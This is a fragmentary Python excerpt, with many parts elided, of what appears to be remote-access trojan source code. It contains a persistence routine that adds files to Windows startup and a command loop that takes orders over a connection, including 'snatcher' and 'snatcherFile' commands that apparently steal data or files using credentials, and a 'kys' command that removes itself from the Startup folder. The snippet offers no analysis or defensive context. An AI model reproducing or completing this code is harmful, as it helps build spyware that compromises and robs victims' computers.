...
def add_to_startup(file_path=""):
       ...
       for filename in src_files:
                if os.path.exists(os.path.join(str(src),str(filename))):
                       try:
...
while True:
        ...
        while True:
                try:
                        ...
                        if data[:8].decode('utf-8')=="snatcher":
                                snatcher(username,password,data[9:].decode('utf-8'),"FSOCIETY")
                        if data[:12].decode('utf-8')=="snatcherFile":
                                snatcherFile(username,password,data[13:].decode('utf-8'),"FSOCIETY")

                        if data[:3].decode('utf-8')=="kys":
                                delete_path="C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" % USER_NAME
